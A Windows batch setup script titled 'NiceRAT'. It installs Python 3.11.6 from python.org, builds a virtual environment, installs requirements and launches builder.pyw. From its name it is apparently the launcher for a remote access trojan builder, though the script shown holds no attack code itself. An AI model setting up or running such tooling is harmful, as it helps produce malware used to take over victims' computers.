@echo off
title NiceRAT - Package Installer and Script Runner

:: Check if Python is installed and matches version 3.11.6
for /f "delims=" %%I in ('python --version 2^>^&1') do set "pyver=%%I"
echo Found %pyver%
if "%pyver%"=="Python 3.11.6" (
    echo Correct version of Python is already installed.
) else (
    echo Python 3.11.6 is not installed. Attempting to install...
    powershell -Command "& { Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe' -OutFile 'python-3.11.6-amd64.exe' }"
    echo Running installer...
    :: Remove /quiet to make the installation process interactive
    start /wait python-3.11.6-amd64.exe InstallAllUsers=1 PrependPath=1

    :: Verify installation
    for /f "delims=" %%I in ('python --version 2^>^&1') do set "pyver=%%I"
    if "%pyver%"=="Python 3.11.6" (
        echo Python 3.11.6 installed successfully.
    ) else (
        echo Done, start run.bat again.
        pause
        exit /b
    )
)


:: Create and activate virtual environment
echo Creating virtual environment...
python -m venv env
call env\Scripts\activate

:: Install dependencies from requirements.txt
echo Installing packages...
pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo Failed to install packages.
    pause
    exit /b
)

echo Packages installed successfully.

:: Run the Python script
call python builder.pyw
if %errorlevel% neq 0 (
    echo Failed to run the builder script. Please check for errors.
    pause
    exit /b
)

echo Script completed successfully.
pause
